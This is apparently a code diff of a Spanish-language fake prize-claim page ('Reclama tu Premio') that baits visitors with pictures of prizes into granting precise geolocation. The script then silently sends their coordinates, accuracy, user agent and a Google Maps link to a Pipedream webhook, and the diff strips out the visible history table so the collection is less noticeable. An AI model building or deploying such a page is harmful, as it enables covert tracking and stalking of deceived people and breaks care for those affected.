@@ -10,16 +10,10 @@ body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; p
 h1 { margin-bottom:15px; color:#222; }
 button { margin:10px; padding:12px 25px; font-size:16px; border:none; border-radius:8px; background:#007bff; color:#fff; cursor:pointer; transition:0.3s; }
 button:hover { background:#0056b3; }
-button:disabled { background:#888; cursor:not-allowed; }
 #msg { margin-top:20px; font-weight:bold; display:none; color:green; }
 .premios { display:none; margin-top:25px; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:15px; }
 .premio-card { background:#fafafa; padding:10px; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
 .premio-card img { width:100%; border-radius:10px; height:150px; object-fit:cover; }
-#historial { margin-top:30px; max-height:250px; overflow-y:auto; background:#f0f0f0; padding:15px; border-radius:12px; text-align:left; }
-#historial table { width:100%; border-collapse:collapse; font-size:14px; }
-#historial th, td { padding:5px 8px; border-bottom:1px solid #ccc; }
-#historial th { background:#007bff; color:#fff; }
-.nuevo { background:#d4edda !important; transition: background 2s ease; }
 canvas { position:fixed; top:0; left:0; pointer-events:none; z-index:999; }
 </style>
 </head>
@@ -31,21 +25,12 @@ canvas { position:fixed; top:0; left:0; pointer-events:none; z-index:999; }
 <h1>✅ Reclama tu Premio</h1>
 <p id="infoText">Pulsa el botón para reclamar tu premio.</p>
 <button id="btnPremio">📍 Reclamar Premio</button>
-<button id="btnDescargar">📥 Descargar Historial</button>
 <p id="msg">🎉 Premios desbloqueados!</p>
 <div class="premios" id="premios"></div>
-
-<div id="historial">
-<h3>📋 Historial de Usuarios:</h3>
-<table>
-<thead><tr><th>Usuario</th><th>Lat</th><th>Lon</th><th>Mapa</th><th>Fecha</th></tr></thead>
-<tbody id="tablaHistorial"></tbody>
-</table>
-</div>
 </div>
 
 <script>
-const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net"; // reemplaza aquí
+const WEBHOOK_URL = "TU_URL_DE_PIPEDREAM"; // reemplaza aquí
 const premios = [
   {nombre:"🚲 Bicicleta", img:"https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg"},
   {nombre:"🎮 Consola Gamer", img:"https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg"},
@@ -56,41 +41,23 @@ const premios = [
 ];
 
 const btnPremio = document.getElementById("btnPremio");
-const btnDescargar = document.getElementById("btnDescargar");
 const infoText = document.getElementById("infoText");
-const tablaHistorial = document.getElementById("tablaHistorial");
 const premiosDiv = document.getElementById("premios");
 const msg = document.getElementById("msg");
 const canvas = document.getElementById("confetti");
 const ctx = canvas.getContext("2d");
 
-let historial = JSON.parse(localStorage.getItem("historialPremios") || "[]");
-const usuarioID = navigator.userAgent + "_" + location.href;
-
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
 
-// Inicializar tabla
-actualizarTabla();
-
-if(historial.some(u=>u.id===usuarioID)){
-  btnPremio.disabled=true;
-  infoText.textContent="✅ Ya reclamaste tu premio";
-  mostrarPremios();
-}
-
 btnPremio.addEventListener("click",()=>{
   if(!navigator.geolocation) return alert("No soporta geolocalización");
-  btnPremio.disabled=true;
   navigator.geolocation.getCurrentPosition(onSuccess,onError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
 });
-
-btnDescargar.addEventListener("click",descargarHistorial);
 
 function onSuccess(pos){
   const maps_link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
   const data = {
-    id: usuarioID,
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
     accuracy: pos.coords.accuracy,
@@ -98,30 +65,24 @@ function onSuccess(pos){
     userAgent: navigator.userAgent,
     maps_link: maps_link
   };
-  let esNuevo = false;
-  if(!historial.some(u=>u.id===usuarioID)){
-    historial.push(data);
-    localStorage.setItem("historialPremios",JSON.stringify(historial,null,2));
-    actualizarTabla(usuarioID);
-    esNuevo = true;
-  }
-  enviarWebhook(data);
+  enviarWebhook(data); // envia todo a Pipedream
   mostrarPremios();
   msg.style.display="block";
-  if(esNuevo) lanzarConfeti();
+  lanzarConfeti();
 }
 
 function onError(err){
   alert("Error al obtener ubicación: "+(err.message||err.code));
-  btnPremio.disabled=false;
 }
 
+// Mostrar premios en cascada
 function mostrarPremios(){
   premiosDiv.style.display="grid";
   premiosDiv.innerHTML="";
   premios.forEach((p,i)=>{
     const card = document.createElement("div");
     card.className="premio-card";
+    card.style.animation = `fadeIn 0.5s ease forwards`;
     card.style.animationDelay = `${i*0.2}s`;
     card.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h3>${p.nombre}</h3>`;
     premiosDiv.appendChild(card);
@@ -159,32 +120,13 @@ function lanzarConfeti(){
   setTimeout(()=>{ cancelAnimationFrame(frame); ctx.clearRect(0,0,canvas.width,canvas.height); },7000);
 }
 
-// Descargar historial
-function descargarHistorial(){
-  const blob = new Blob([JSON.stringify(historial,null,2)],{type:"application/json"});
-  const a = document.createElement("a");
-  a.href = URL.createObjectURL(blob);
-  a.download="historial_premios.json";
-  a.click();
-}
-
 // Enviar a Pipedream
 async function enviarWebhook(data){
   try{
     await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data,null,2)});
   }catch(err){ console.error("Error webhook",err);}
 }
-
-// Actualizar tabla visual
-function actualizarTabla(nuevoID=null){
-  tablaHistorial.innerHTML="";
-  historial.forEach(u=>{
-    const tr = document.createElement("tr");
-    tr.innerHTML = `<td>${u.userAgent}</td><td>${u.lat.toFixed(5)}</td><td>${u.lon.toFixed(5)}</td><td><a href="${u.maps_link}" target="_blank">Ver Mapa</a></td><td>${u.fecha}</td>`;
-    if(nuevoID && u.id===nuevoID) tr.classList.add("nuevo");
-    tablaHistorial.appendChild(tr);
-  });
-}
 </script>
 </body>
 </html>
+
